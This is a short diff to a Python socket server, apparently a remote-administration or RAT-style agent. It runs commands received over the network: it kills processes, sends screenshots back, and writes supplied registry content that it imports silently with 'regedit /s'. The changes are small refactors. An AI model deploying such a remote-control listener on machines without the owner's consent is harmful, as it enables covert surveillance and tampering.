@@ -104,7 +104,7 @@ def main():
         s.bind((HOST,PORT))
         s.listen()
         while True:
-            print("server wait")
+            print("server ",HOST,":",str(PORT)," wait")
             conn, addr = s.accept()
             with conn:
                 print('Connected by',addr)
@@ -117,8 +117,9 @@ def main():
                     print(data)
                     x=data.split('//')
                     if x[0]=="quit":
-                        conn.close()
-                        exit()
+                        break
+                    if x[0]=="ping":
+                        pass
                     if x[0]=="process":
                         if x[1]=="kill":
                             if Check_Process(x[2]):
@@ -166,7 +167,6 @@ def main():
                         f=open("screenshot.png",'rb')
                         l=f.read(4096)
                         while(l):
-                            print('Send 4096')
                             conn.send(l)
                             l=f.read(4096)
                         f.close()
@@ -229,13 +229,10 @@ def main():
                             f=open("keys.reg","w")
                             f.write(x[2])
                             f.close()
-                            print("regedit /s "+os.path.abspath(os.getcwd())+"\\keys.reg")
-                            os.system("regedit /s "+os.path.abspath(os.getcwd())+"\\keys.reg")
                             try:
-                                print("ok")
+                                os.system("regedit /s "+os.path.abspath(os.getcwd())+"\\keys.reg")
                                 conn.sendall(b'ok')
                             except:
-                                print("kook")
                                 conn.sendall(b'404')
                         else:
                             if x[2]=="get_value": #get_value//PATH//name
